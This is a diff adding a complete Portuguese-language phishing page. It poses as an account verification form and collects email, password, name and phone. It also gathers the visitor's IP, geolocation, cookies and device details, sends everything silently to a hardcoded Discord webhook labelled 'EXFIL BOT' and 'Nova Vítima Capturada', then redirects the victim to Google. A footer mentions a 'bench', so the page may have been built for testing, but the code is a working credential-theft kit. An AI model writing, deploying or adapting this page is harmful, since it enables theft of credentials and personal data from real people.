@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Verificação de Conta</title>
+  <style>
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: #1a1a2e;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .card {
+      background: #16213e;
+      border: 1px solid #0f3460;
+      border-radius: 12px;
+      padding: 40px;
+      width: 360px;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.5);
+    }
+    h2 { color: #e94560; margin-bottom: 8px; font-size: 1.4rem; }
+    p  { color: #aaa; font-size: 0.85rem; margin-bottom: 24px; }
+    label { color: #ccc; font-size: 0.8rem; display: block; margin-bottom: 4px; }
+    input {
+      width: 100%;
+      background: #0f3460;
+      border: 1px solid #1a4a8a;
+      border-radius: 6px;
+      padding: 10px 12px;
+      color: #fff;
+      font-size: 0.9rem;
+      margin-bottom: 16px;
+      outline: none;
+    }
+    input:focus { border-color: #e94560; }
+    button {
+      width: 100%;
+      background: #e94560;
+      color: #fff;
+      border: none;
+      border-radius: 6px;
+      padding: 12px;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    button:hover { background: #c73652; }
+    .status { color: #4caf50; font-size: 0.8rem; margin-top: 12px; text-align: center; display: none; }
+  </style>
+</head>
+<body>
+<div class="card">
+  <h2>⚠️ Verificação Necessária</h2>
+  <p>Por segurança, confirme seus dados para continuar acessando sua conta.</p>
+
+  <label>E-mail</label>
+  <input type="email" id="email" placeholder="seuemail@exemplo.com" />
+
+  <label>Senha</label>
+  <input type="password" id="senha" placeholder="••••••••" />
+
+  <label>Nome completo</label>
+  <input type="text" id="nome" placeholder="Seu nome" />
+
+  <label>Telefone (opcional)</label>
+  <input type="tel" id="tel" placeholder="+55 11 99999-9999" />
+
+  <button onclick="enviar()">Verificar conta</button>
+  <div class="status" id="status">✔ Verificação concluída. Redirecionando...</div>
+</div>
+
+<script>
+  const WEBHOOK = "https://discord.com/api/webhooks/1569297484256116817/8htEXMJyqkN6_4-Cr5ZD2RAALYiJOIIcr0GrRQqbDdF3Z-X8KQpGNgabOaZzLfYspOhf"; // ← substitui isso
+
+  async function getIP() {
+    try {
+      const r = await fetch("https://api.ipify.org?format=json");
+      const d = await r.json();
+      return d.ip;
+    } catch { return "não obtido"; }
+  }
+
+  async function getGeo(ip) {
+    try {
+      const r = await fetch(`https://ipapi.co/${ip}/json/`);
+      const d = await r.json();
+      return `${d.city}, ${d.region}, ${d.country_name} | ISP: ${d.org}`;
+    } catch { return "não obtido"; }
+  }
+
+  async function enviar() {
+    const email = document.getElementById("email").value;
+    const senha = document.getElementById("senha").value;
+    const nome  = document.getElementById("nome").value;
+    const tel   = document.getElementById("tel").value;
+
+    const ip  = await getIP();
+    const geo = await getGeo(ip);
+
+    const ua        = navigator.userAgent;
+    const lang      = navigator.language;
+    const plat      = navigator.platform;
+    const screen_r  = `${screen.width}x${screen.height}`;
+    const tz        = Intl.DateTimeFormat().resolvedOptions().timeZone;
+    const ref       = document.referrer || "direto";
+    const cookies   = document.cookie || "nenhum";
+    const memoria   = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "não disponível";
+    const cores     = navigator.hardwareConcurrency || "?";
+    const online    = navigator.onLine;
+    const toque     = navigator.maxTouchPoints;
+    const url_atual = window.location.href;
+
+    const payload = {
+      username: "🔴 EXFIL BOT",
+      avatar_url: "https://i.imgur.com/4M34hi2.png",
+      embeds: [{
+        title: "🎯 Nova Vítima Capturada",
+        color: 0xe94560,
+        fields: [
+          { name: "📧 E-mail",        value: email  || "—", inline: true },
+          { name: "🔑 Senha",         value: senha  || "—", inline: true },
+          { name: "👤 Nome",          value: nome   || "—", inline: true },
+          { name: "📞 Telefone",      value: tel    || "—", inline: true },
+          { name: "🌐 IP",            value: ip,             inline: true },
+          { name: "📍 Localização",   value: geo,            inline: false },
+          { name: "🌍 Fuso Horário",  value: tz,             inline: true },
+          { name: "🗣️ Idioma",        value: lang,           inline: true },
+          { name: "🖥️ Plataforma",    value: plat,           inline: true },
+          { name: "📐 Resolução",     value: screen_r,       inline: true },
+          { name: "🧠 RAM",           value: memoria,        inline: true },
+          { name: "⚙️ CPU Cores",     value: String(cores),  inline: true },
+          { name: "👆 Touch Points",  value: String(toque),  inline: true },
+          { name: "📶 Online",        value: String(online), inline: true },
+          { name: "🍪 Cookies",       value: cookies.slice(0,500) || "nenhum", inline: false },
+          { name: "🔗 Referrer",      value: ref,            inline: true },
+          { name: "🌐 URL",           value: url_atual,      inline: false },
+          { name: "🤖 User-Agent",    value: ua.slice(0,500), inline: false },
+        ],
+        footer: { text: "olliE bench exfil · " + new Date().toLocaleString("pt-BR") }
+      }]
+    };
+
+    try {
+      await fetch(WEBHOOK, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      });
+    } catch(e) { /* silencioso */ }
+
+    document.getElementById("status").style.display = "block";
+    setTimeout(() => {
+      window.location.href = "https://google.com"; // redireciona depois
+    }, 2000);
+  }
+</script>
+</body>
+</html>
